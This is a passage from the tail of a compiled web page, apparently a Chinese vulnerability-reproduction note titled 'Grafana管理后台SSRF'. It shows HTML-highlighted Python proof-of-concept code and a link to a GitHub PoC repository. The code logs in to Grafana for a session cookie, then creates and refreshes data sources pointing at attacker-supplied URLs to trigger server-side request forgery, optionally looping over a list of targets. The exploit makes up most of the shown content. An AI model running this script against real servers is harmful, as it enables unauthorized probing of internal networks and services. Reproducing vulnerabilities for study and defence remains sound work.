<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>ghost<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
	rawBody <span class="token operator">=</span> <span class="token string">&quot;{\\&quot;user\\&quot;:\\&quot;&quot;</span><span class="token operator">+</span>username<span class="token operator">+</span><span class="token string">&quot;\\&quot;,\\&quot;password\\&quot;:\\&quot;&quot;</span><span class="token operator">+</span>password<span class="token operator">+</span><span class="token string">&quot;\\&quot;,\\&quot;email\\&quot;:\\&quot;\\&quot;}&quot;</span>
	headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json, text/plain, */*&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/signup&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Connection&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;close&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;content-type&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;en-US,en;q=0.5&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;Accept-Encoding&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;gzip, deflate&quot;</span><span class="token punctuation">}</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;redirect_to&quot;</span><span class="token punctuation">:</span><span class="token string">&quot;%2F&quot;</span><span class="token punctuation">}</span>
	response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token operator">+</span>ghost<span class="token operator">+</span><span class="token string">&quot;/login&quot;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>rawBody<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token string">&quot;grafana_session&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>cookies<span class="token punctuation">:</span>
		<span class="token keyword">return</span> response<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">&quot;grafana_session&quot;</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> <span class="token string">&quot;grafana_sess&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>cookies<span class="token punctuation">:</span>
		<span class="token keyword">return</span> response<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">&quot;grafana_sess&quot;</span><span class="token punctuation">]</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Login Session Cookie not set&quot;</span><span class="token punctuation">)</span>
		sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>



<span class="token keyword">if</span> username<span class="token punctuation">:</span>
	sessionid <span class="token operator">=</span> login<span class="token punctuation">(</span>ghost<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span>
	



<span class="token keyword">if</span> ssrf_url<span class="token punctuation">:</span>
	i <span class="token operator">=</span> create_source <span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">,</span>ghost<span class="token punctuation">)</span>
	<span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
	refresh_source<span class="token punctuation">(</span>ghost<span class="token punctuation">,</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span>
	create_ssrf<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">,</span>ghost<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span>
	check_ssrf<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">)</span>

<span class="token keyword">if</span> files<span class="token punctuation">:</span>
	<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> <span class="token string">&#39;r&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
			<span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>
				ssrf_url <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;\\n&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>
				i <span class="token operator">=</span> create_source <span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">,</span>ghost<span class="token punctuation">)</span>
				<span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
				refresh_source<span class="token punctuation">(</span>ghost<span class="token punctuation">,</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span>
				create_ssrf<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">,</span>ghost<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span>
				check_ssrf<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">,</span>ghost<span class="token punctuation">,</span>ssrf_url<span class="token punctuation">)</span>
			f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6);function b(m,f){const a=e("ExternalLinkIcon");return c(),u("div",null,[l,r,k,s("ul",null,[s("li",null,[s("a",d,[n("https://github.com/RandomRobbieBF/grafana-ssrf"),t(a)])])]),q,s("p",null,[n("使用"),s("a",v,[n("这个POC"),t(a)]),n("来复现SSRF漏洞：")]),g])}const _=p(i,[["render",b],["__file","Grafana管理后台SSRF.html.vue"]]);export{_ as default};
